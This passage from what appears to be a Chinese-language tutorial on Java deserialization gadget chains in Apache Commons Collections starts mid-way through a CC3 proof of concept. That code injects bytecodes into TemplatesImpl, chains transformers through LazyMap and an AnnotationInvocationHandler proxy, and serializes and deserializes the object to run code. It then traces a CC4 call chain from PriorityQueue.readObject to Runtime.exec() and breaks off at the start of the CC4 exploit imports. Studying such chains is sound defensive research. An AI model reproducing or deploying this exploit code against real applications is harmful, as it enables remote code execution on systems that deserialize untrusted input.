            //补充实例化新建类所需的条件
            TemplatesImpl templates = TemplatesImpl.class.newInstance();
            setFieldValue(templates, "_bytecodes", targetByteCodes);
            setFieldValue(templates, "_name", "blckder02");
            setFieldValue(templates, "_class", null);
            //实例化新建类
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
            };
            ChainedTransformer transformerChain = new ChainedTransformer(transformers);
            //调用get()中的transform方法
            HashMap innermap = new HashMap();
            LazyMap outerMap = (LazyMap)LazyMap.decorate(innermap,transformerChain);
            //设置代理，触发invoke()调用get()方法
            Class cls1 = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor construct = cls1.getDeclaredConstructor(Class.class, Map.class);
            construct.setAccessible(true);
            InvocationHandler handler1 = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
            Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler1);
            InvocationHandler handler2 = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);
            try{
                ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc3.bin"));
                outputStream.writeObject(handler2);
                outputStream.close();
                ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc3.bin"));
                inputStream.readObject();
            }catch(Exception e){
                e.printStackTrace();
            }
        }
        public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
            final Field field = getField(obj.getClass(), fieldName);
            field.set(obj, value);
        }
        public static Field getField(final Class clazz, final String fieldName) {
            Field field = null;
            try {
                field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
            }
            catch (NoSuchFieldException ex) {
                if (clazz.getSuperclass() != null)
                    field = getField(clazz.getSuperclass(), fieldName);
            }
            return field;
        }
    }
## CC4
### 环境搭建
          org.apache.commons
          commons-collections4
          4.0
### 调用链分析
调用链
    getTransletInstancePriorityQueue.readObject
        PriorityQueue.heapify
            PriorityQueue.siftDown
                PriorityQueue.siftDownUsingComparator
                    TransformingComparator.compare
                        ChainedTransformer.transform
                            TrAXFilter(构造方法)    
                                TemplatesImpl.newTransformer
                                    TemplatesImpl.getTransletInstance
                                        TemplatesImpl.defineTransletClasses
                                            (动态创建的类)cc4.newInstance()
                                                   Runtime.exec()
同过观察调用链，我们可以发现，后半段的调用是相同的，只是入口点不同而已。那么分析一下`ChainedTransformer.transform`之上的入口
此方法被 PriorityQueue的siftDownUsingComparator调用  
右键 find Usages，发现只有一处调用 PriorityQueue.siftDown
同样，看一下它的调用情况
有三处，每个跟一下，发现只有heapify被readObj调用
ok，到这里链子大概就清晰了
### POC分析
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
    import org.apache.commons.collections4.Transformer;